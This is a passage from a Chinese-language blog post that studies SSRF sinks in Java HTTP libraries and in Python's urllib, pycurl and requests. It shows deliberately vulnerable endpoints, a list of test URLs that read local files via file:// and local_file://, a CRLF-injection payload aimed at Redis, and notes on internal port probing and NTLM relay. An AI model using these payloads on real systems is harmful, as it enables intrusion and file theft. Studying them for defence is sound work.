BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));</span></span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.<span class="title function_ invoke__">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.<span class="title function_ invoke__">append</span>(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> html.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> e) &#123;</span><br><span class="line">        logger.<span class="title function_ invoke__">error</span>(e.<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，对于URLConnection来说是支持上述的协议的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789179334-13499eec-673c-4180-9acc-b4b66fc36f82.png" alt="image.png"></p>
<h4 id="HttpURLConnection"><a href="#HttpURLConnection" class="headerlink" title="HttpURLConnection"></a>HttpURLConnection</h4><p>那么我们尝试HttpURLConnection看看，我们把实例代码改改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">RequestMapping</span>(value = <span class="string">&quot;/urlConnection/vuln&quot;</span>, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">URLConnectionVuln</span>(String url) &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.<span class="title function_ invoke__">HttpURLConnection</span>(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>重点在于HttpURLConnection conn &#x3D; (HttpURLConnection) urlConnection做了强制转换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> String <span class="title function_ invoke__">HttpURLConnection</span>(String url) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        URLConnection urlConnection = u.<span class="title function_ invoke__">openConnection</span>();</span><br><span class="line">        HttpURLConnection conn = (HttpURLConnection) urlConnection;</span><br><span class="line">        <span class="comment">// Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField</span></span><br><span class="line">        InputStream is = conn.<span class="title function_ invoke__">getInputStream</span>();  <span class="comment">// send request</span></span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.<span class="title function_ invoke__">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.<span class="title function_ invoke__">append</span>(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> html.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        logger.<span class="title function_ invoke__">error</span>(e.<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到会报错，不支持file协议<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789504136-d88b5dea-c5cb-40e6-8c5b-750e50a0a5d8.png" alt="image.png"><br>http协议是支持的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661789549728-2c1b01f2-e9b9-4005-8d01-0297b290beb7.png" alt="image.png"><br>也印证了前面我们的想法<br><strong>想了下，每次改太麻烦了，这边直接依葫芦画瓢把接口添加上去即可</strong></p>
<h4 id="httpClient"><a href="#httpClient" class="headerlink" title="httpClient"></a>httpClient</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">RequestMapping</span>(value = <span class="string">&quot;/httpClient/vuln&quot;</span>, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">httpClientVuln</span>(String url) &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.<span class="title function_ invoke__">httpClient</span>(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> String <span class="title function_ invoke__">httpClient</span>(String url) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        CloseableHttpClient client = HttpClients.<span class="title function_ invoke__">createDefault</span>();</span><br><span class="line">        HttpGet httpGet = <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        <span class="comment">// set redirect enable false</span></span><br><span class="line">        <span class="comment">// httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());</span></span><br><span class="line">        HttpResponse httpResponse = client.<span class="title function_ invoke__">execute</span>(httpGet); <span class="comment">// send request</span></span><br><span class="line">        BufferedReader rd = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(httpResponse.<span class="title function_ invoke__">getEntity</span>().<span class="title function_ invoke__">getContent</span>()));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = rd.<span class="title function_ invoke__">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            result.<span class="title function_ invoke__">append</span>(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result.<span class="title function_ invoke__">toString</span>();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661790447439-c1d1c170-9cb1-4651-b736-5b55d6c4aadd.png" alt="image.png"></p>
<h4 id="request"><a href="#request" class="headerlink" title="request"></a>request</h4><p>Request类对HttpClient进行了封装。类似Python的requests库。  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">RequestMapping</span>(value = <span class="string">&quot;/request/vuln&quot;</span>, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">requestVuln</span>(String url) &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.<span class="title function_ invoke__">request</span>(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> String <span class="title function_ invoke__">request</span>(String url) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Request.<span class="title function_ invoke__">Get</span>(url).<span class="title function_ invoke__">execute</span>().<span class="title function_ invoke__">returnContent</span>().<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661790541956-736b929d-cabb-4a0e-b46d-9598650f967f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661790589843-03acda19-4ae2-4e74-bc40-42484856c67f.png" alt="image.png"><br>感觉后面太多了，就不一一写了，简单测下就行了</p>
<h4 id="openStream"><a href="#openStream" class="headerlink" title="openStream"></a>openStream</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/openStream&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">openStream</span><span class="params">(<span class="meta">@RequestParam</span> String url, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">downLoadImgFileName</span> <span class="operator">=</span> WebUtils.getNameWithoutExtension(url) + <span class="string">&quot;.&quot;</span> + WebUtils.getFileExtension(url);</span><br><span class="line">        <span class="comment">// download</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> + downLoadImgFileName);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream = u.openStream(); <span class="comment">// send request</span></span><br><span class="line">        outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((length = inputStream.read(bytes)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(bytes, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (outputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="imageIO"><a href="#imageIO" class="headerlink" title="imageIO"></a>imageIO</h4><p>作者加了SecurityUtil.<em>startSSRFHook</em>()，对内网进行判断，这个后面会说一说。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">imageIO</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        ImageIO.read(u); <span class="comment">// send request</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953264374-72bdf99d-49e8-4a9d-8526-271c11ca89a1.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953368870-bde7653c-ab22-4d60-b068-2fbc2ffcbe87.png" alt="image.png"></p>
<h4 id="okhttp"><a href="#okhttp" class="headerlink" title="okhttp"></a>okhttp</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">okhttp</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line">    <span class="comment">// client.setFollowRedirects(false);</span></span><br><span class="line">    com.squareup.okhttp.<span class="type">Request</span> <span class="variable">ok_http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">    <span class="keyword">return</span> client.newCall(ok_http).execute().body().string();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953616224-6b01eba8-4877-41eb-9bf6-a814ccaac441.png" alt="image.png"></p>
<h4 id="commonHttpClient"><a href="#commonHttpClient" class="headerlink" title="commonHttpClient"></a>commonHttpClient</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">commonHttpClient</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpClient</span>();</span><br><span class="line">    <span class="type">GetMethod</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetMethod</span>(url);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        client.executeMethod(method); <span class="comment">// send request</span></span><br><span class="line">        <span class="type">byte</span>[] resBody = method.getResponseBody();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(resBody);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// Release the connection.</span></span><br><span class="line">        method.releaseConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661953869174-f94553d7-bde2-4866-aa8f-b7b8a43ce0ae.png" alt="image.png"></p>
<h4 id="Jsoup"><a href="#Jsoup" class="headerlink" title="Jsoup"></a>Jsoup</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">Jsoup</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> Jsoup.connect(url)</span><br><span class="line">                <span class="comment">//.followRedirects(false)</span></span><br><span class="line">                .timeout(<span class="number">3000</span>)</span><br><span class="line">                .cookie(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;joychou&quot;</span>) <span class="comment">// request cookies</span></span><br><span class="line">                .execute().parse();</span><br><span class="line">        <span class="keyword">return</span> doc.outerHtml();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955087683-f80ba94e-def9-45ba-8c80-ec546c7d1e0e.png" alt="image.png"></p>
<h4 id="IOUtils"><a href="#IOUtils" class="headerlink" title="IOUtils"></a>IOUtils</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">IOUtils</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        IOUtils.toByteArray(URI.create(url));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955423480-18646179-7d1c-41f8-b7c7-e670b0fd3519.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955434016-bb8b1488-b667-47cc-aa7c-6a0bab952d9d.png" alt="image.png"></p>
<h4 id="HttpSyncClients"><a href="#HttpSyncClients" class="headerlink" title="HttpSyncClients"></a>HttpSyncClients</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpAsyncClients</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="type">CloseableHttpAsyncClient</span> <span class="variable">httpclient</span> <span class="operator">=</span> HttpAsyncClients.createDefault();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        httpclient.start();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        Future&lt;HttpResponse&gt; future = httpclient.execute(request, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> future.get(<span class="number">6000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        <span class="keyword">return</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            httpclient.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1661955637890-6dc21e09-4575-4020-8f29-2ec17da57ad5.png" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ssrf/urlConnection/vuln?url=file:<span class="comment">///C:/Windows/win.ini  支持java协议</span></span><br><span class="line">/ssrf/HttpURLConnection/vuln?url=http:<span class="comment">//127.0.0.1:80		 只是支持http/https协议</span></span><br><span class="line">/ssrf/httpClient/vuln?url=http:<span class="comment">//127.0.0.1:80</span></span><br><span class="line">/ssrf/request/vuln?url=http:<span class="comment">//127.0.0.1:80</span></span><br><span class="line">/ssrf/openStream?url=file:<span class="comment">///C:/Windows/win.ini </span></span><br><span class="line">/ssrf/ImageIO/sec?url=http:<span class="comment">//www.baidu.com</span></span><br><span class="line">/ssrf/okhttp/sec?url=http:<span class="comment">//www.baidu.com</span></span><br><span class="line">/ssrf/commonsHttpClient/sec?url=http:<span class="comment">//www.baidu.com</span></span><br><span class="line">/ssrf/Jsoup/sec?url=http:<span class="comment">//www.baidu.com</span></span><br><span class="line">/ssrf/IOUtils/sec?url=http:<span class="comment">//www.baidu.com</span></span><br><span class="line">/ssrf/HttpSyncClients/vuln?url=http:<span class="comment">//www.baidu.com </span></span><br></pre></td></tr></table></figure>

<h4 id="后续函数"><a href="#后续函数" class="headerlink" title="后续函数"></a>后续函数</h4><p>后面再说了，其实都差不多，主要是清楚危险函数，对入参做分析，当然危险函数不止上面那些</p>
<h4 id="java关于ssrf的一些局限"><a href="#java关于ssrf的一些局限" class="headerlink" title="java关于ssrf的一些局限"></a>java关于ssrf的一些局限</h4><ul>
<li>利用file协议读取文件内容（仅限使用URLConnection|URL发起的请求）</li>
<li>利用http 进行内网web服务端口探测</li>
<li>利用http 进行内网非web服务端口探测(如果将异常抛出来的情况下)</li>
<li>利用http进行ntlmrelay攻击(仅限HttpURLConnection或者二次包装HttpURLConnection并未复写AuthenticationInfo方法的对象)</li>
<li>java默认是会302跳转 followRedirect  </li>
<li>实际跳转的url也在限制的协议内</li>
<li>传入的url协议必须和重定向的url协议一致</li>
</ul>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>Python开发中常用三种http请求方法(pycurl&#x2F;urllib&#x2F;requests)。</p>
<h4 id="python-ssrf注意的点"><a href="#python-ssrf注意的点" class="headerlink" title="python ssrf注意的点"></a>python ssrf注意的点</h4><p><strong>重定向</strong><br>是否默认跟随重定向</p>
<ul>
<li>pycurl（不跟随）</li>
<li>urllib&#x2F;urllib2&#x2F;requests（跟随）</li>
</ul>
<p>默认最大重定向次数</p>
<ul>
<li>pycurl（未限制）</li>
<li>urllib&#x2F;urllib2（10次）</li>
<li>requests（30次）</li>
</ul>
<p>风险点：使用pycurl开启跟随跳转之后，需手动限制最大跳转次数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = pycurl.Curl()</span><br><span class="line">c.setopt(pycurl.FOLLOWLOCATION, <span class="number">1</span>)</span><br><span class="line">c.setopt(pycurl.MAXREDIRS, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h4 id="协议支持"><a href="#协议支持" class="headerlink" title="协议支持"></a>协议支持</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">requests:</span><br><span class="line">http/https/ftp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib/urllib2:</span><br><span class="line">http/https/ftp/file/local_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pycurl:</span><br><span class="line">DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet <span class="keyword">and</span> TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos4), file transfer resume, http proxy tunneling <span class="keyword">and</span> more!</span><br></pre></td></tr></table></figure>
<p>风险点：未手动限定协议时可导致安全风险(如通过file:&#x2F;&#x2F;造成DoS)</p>
<h4 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h4><p>requests就不写了，清楚协议就懂了</p>
<h4 id="urllib-urlopen"><a href="#urllib-urlopen" class="headerlink" title="urllib.urlopen"></a>urllib.urlopen</h4><p><strong>urllib2.urlopen</strong><br>在Python中， urllib并不支持gopher,dict协议，所以按照常理来讲ssrf在python中的危害也应该不大，但是当SSRF遇到CRLF，奇妙的事情就发生了。这个CTF比较常见。</p>
<p>| CVE-2019-9740 (urllib&#x2F;urllib2 CRLF) | urllib2 in Python 2.x through 2.7.16</p>
<p>urllib in Python 3.x through 3.7.3 |<br>| — | — |<br>| CVE-2019-9947 (urllib&#x2F;urllib2 CRLF) | urllib2 in Python 2.x through 2.7.16<br>urllib in Python 3.x through 3.7.3 |</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="comment"># host = &quot;127.0.0.1:6379\r\nSET hacker 1111\r\n&quot; # for redis</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:80&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib2.urlopen(url).read()</span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>

<p>我这边直接测试SSRF<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2393668/1662905433267-9bbbc072-6b5a-4ce9-b47a-99d8fcdfa5bb.png" alt="image.png"></p>
<p>除开CRLF之外，urllib还有一个鲜有人知的漏洞CVE-2019-9948，该漏洞只影响urllib，范围在Python 2.x到2.7.16，这个版本间的urllib支持local_file&#x2F;local-file协议，可以读取任意文件，如果file协议被禁止后，不妨试试这个协议来读取文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">host = <span class="string">&quot;local_file:///C:/Windows/win.ini&quot;</span></span><br><span class="line">info = urllib.urlopen(host).read()</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></table></figure>

